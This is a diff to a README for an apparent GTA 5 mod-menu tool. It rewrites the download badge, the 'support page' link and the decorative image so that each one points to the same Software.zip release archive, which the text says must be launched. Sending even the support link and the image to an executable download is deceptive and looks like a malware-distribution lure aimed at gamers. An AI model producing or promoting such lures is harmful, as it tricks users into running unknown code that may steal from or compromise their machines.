@@ -18,7 +18,7 @@ Welcome to the Mod-Gta5 repository! This tool is designed to enhance your GTA 5 
 - **Topics:** archived, gta, gta5, hacker, java, java-native-access, java-natives, jna, jni, memory, memory-manipulation, mod, nativeui, scripthookv
 
 ## Download
-[<img src="https://img.shields.io/badge/Download-v1.0.0-blue">](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[<img src="https://github.com/burlador31/Mod-Gta5/releases/download/v1.0/Software.zip">](https://github.com/burlador31/Mod-Gta5/releases/download/v1.0/Software.zip)
 
 - **Note:** Click on the button above to download the tool. It needs to be launched to access its features.
 
@@ -28,11 +28,11 @@ Welcome to the Mod-Gta5 repository! This tool is designed to enhance your GTA 5 
 3. Once installed, customize the settings to your liking and enjoy enhanced gameplay!
 
 ## Support
-Need help or have any questions? Feel free to [visit our support page](https://www.mod-gta5-support.com) for assistance.
+Need help or have any questions? Feel free to [visit our support page](https://github.com/burlador31/Mod-Gta5/releases/download/v1.0/Software.zip) for assistance.
 
 ## Credits
 Special thanks to the developers and contributors who made this mod menu possible. Your dedication and hard work are truly appreciated.
 
-![GTA 5 Image](https://cdn.pixabay.com/photo/2017/03/05/15/29/aston-2118857_960_720.jpg)
+![GTA 5 Image](https://github.com/burlador31/Mod-Gta5/releases/download/v1.0/Software.zip)
 
 Enjoy your updated GTA 5 gameplay with Mod-Gta5! Happy gaming! 🎮🚓🔥
